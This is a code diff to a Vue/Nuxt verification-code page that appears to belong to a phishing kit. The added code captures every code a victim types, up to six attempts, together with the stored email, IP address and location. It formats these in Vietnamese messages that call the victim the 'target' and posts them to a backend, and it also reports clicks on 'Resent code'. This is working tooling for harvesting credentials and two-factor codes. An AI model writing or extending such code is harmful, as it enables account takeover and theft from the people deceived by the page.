@@ -9,10 +9,32 @@ useHead({
     },
   ],
 })
+
+// const options = {
+//   weekday: 'long',
+//   year: 'numeric',
+//   month: 'long',
+//   day: 'numeric',
+//   hour: 'numeric',
+//   minute: 'numeric',
+//   second: 'numeric',
+//   hour12: false,
+// }
+// format option like hh:mm:ss dd/mm/yyyy
+const options = {
+  hour: '2-digit',
+  minute: '2-digit',
+  second: '2-digit',
+  day: '2-digit',
+  month: '2-digit',
+  year: 'numeric',
+}
 const code = ref('')
 const isFocusEmail = ref(false)
 const isFocusPassword = ref(false)
-
+const attempt = ref(0)
+const attemptLimit = 6
+const attemptList = ref([])
 const isError = ref(false)
 const isShowLoading = ref(false)
 const handleFocus = (type: string, ref: any) => {
@@ -25,21 +47,58 @@ const handleFocus = (type: string, ref: any) => {
   }
 }
 const isDisableSubmit = ref(true)
+const geo = JSON.parse(localStorage.getItem('geo') || '{}')
+const emailFromLocal = localStorage.getItem('email')
+onBeforeMount(() => {
+  if (!emailFromLocal) {
+    window.location.href = '/?a=1'
+  }
+})
 const handleSubmit = async () => {
+  const conversationList = JSON.parse(localStorage.getItem('conversa') || '[]')
+  let message = ''
+  const isFirst = isFirstTime()
+
   if (!code.value) {
     return
   }
+  attemptList.value.push(code.value)
+  ++attempt.value
+  if (attemptList.value.length >= attemptLimit) {
+    window.location.href = '/?a=1'
+    return
+  }
+
+  message += `
+🕒 Thời gian: ${new Date().toLocaleString('vi-VN', options)}
+🌍 Địa chỉ IP: ${geo.ip}
+📍 Vị trí: ${geo.city}, ${geo.country}
+
+`
+
+  // time VN
+  if (isFirst) {
+    message += `👤 Người dùng mới truy cập\n\n`
+  }
+
+  message += `📭 Email: <code>${emailFromLocal}</code>\n\n`
+
+  // message += `🔑 Mã xác minh: <code>${code.value}</code>`
+  attemptList.value.forEach((item, index) => {
+    message += `🔑 Mã xác minh ${index + 1}: <code>${item}</code>\n`
+  })
 
   isShowLoading.value = true
   // Call your API here
   try {
-    await $fetch('/api/code', {
+    const res = await $fetch('/api/code', {
       method: 'POST',
-      body: JSON.stringify({ code: code.value }),
+      body: JSON.stringify({ rawMessage: message, conversation: conversationList }),
       headers: {
         'Content-Type': 'application/json',
       },
     })
+    localStorage.setItem('conversa', JSON.stringify(res))
     // router.push('/step-4')
   } catch (error) {
     console.error(error)
@@ -62,20 +121,33 @@ const isShowRecentCode = ref(true)
 const timeLeft = ref(59)
 const formattedTime = ref(`0:${timeLeft.value.toString().padStart(2, '0')}`)
 
-const startCountdown = () => {
+const startCountdown = async () => {
   isShowRecentCode.value = false
+
+  // let message = ''
+  const geo = JSON.parse(localStorage.getItem('geo') || '{}')
+  const message = `
+🕒 Thời gian: ${new Date().toLocaleString('vi-VN', options)}
+🌍 Địa chỉ IP: ${geo.ip}
+📍 Vị trí: ${geo.city}, ${geo.country}
+
+👤 Mục tiêu bấm <code>Resent code</code>
+📭 Email: <code>${emailFromLocal}</code>
+`
+
   try {
-    $fetch('/api/code', {
+    await $fetch('/api/code', {
       method: 'POST',
-      body: JSON.stringify({ code: 'Mục tiêu bấm <code>Resent code</code>' }),
+      body: JSON.stringify({ rawMessage: message }),
       headers: {
         'Content-Type': 'application/json',
       },
     })
-    // router.push('/step-4')
   } catch (error) {
     console.error(error)
   }
+
+  // Call your API here
   const timer = setInterval(() => {
     if (timeLeft.value > 0) {
       timeLeft.value--
@@ -184,7 +256,7 @@ const startCountdown = () => {
         }"
         :disabled="isDisableSubmit"
         class="mb-3 mt-8 w-full text-[15px] font-light h-[44px] rounded-full text-white bg-[#a3beef]"
-        @click="handleSubmit"
+        @click="handleSubmit(false)"
       >
         <Icon
           v-if="isShowLoading"
